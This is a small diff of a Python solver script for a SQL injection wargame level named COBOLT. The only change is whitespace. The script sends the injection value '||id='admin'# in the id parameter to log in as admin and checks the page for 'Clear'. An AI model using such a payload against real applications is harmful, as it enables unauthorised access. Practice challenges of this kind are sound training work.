@@ -25,7 +25,7 @@ cookies = {'PHPSESSID' : 'My PHPSESSID'}
 params = {}
 params['id'] = "'||id='admin'#"
 
-res = requests.get(url, cookies=cookies, params=params)
+res = requests.get(url, cookies = cookies, params = params)
 
 if "Clear" in res.text :
     print("[♪] COBOLT Clear!")
